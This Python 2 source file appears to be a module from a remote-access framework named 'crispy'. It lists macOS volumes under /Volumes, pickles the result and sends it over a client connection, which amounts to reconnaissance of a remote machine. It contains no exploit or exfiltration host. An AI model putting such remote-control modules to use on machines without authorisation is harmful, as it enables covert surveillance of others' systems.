import cPickle
import logging

from crispy.lib.module import *
from crispy.lib.fprint import *

logger = logging.getLogger(__name__)

__class_name__ = "DrivesModule"
class DrivesModule(CrispyModule):
    """ Enumerate the drives/mounts on a remote machine. """
    
    # can be: 'darwin', 'linux', 'windows', 'android'
    compatible_systems = ['Darwin']

    def marshall_darwin(self):
        import os

        partitions = os.listdir('/Volumes')
        
        info = ""
        for disk in partitions:
            info += "{}\n".format(disk)
        return info

    def run(self, args):
	logger.debug("in DrivesModule run()")
        
        if (self.is_compatible()):
            if self.client.is_darwin():
                data = cPickle.dumps(self.marshall_darwin(), -1)
                
            info("Getting partitions now...")
            
            try:
                self.client.conn.sendall(data)
                print self.client.conn.recv(1024).rstrip()
            except Exception as e:
                logger.error(e)
                error(e)
            
            success("Done.")
        else:
            error("Current OS's supported: {}".format(', '.join(self.compatible_systems)))
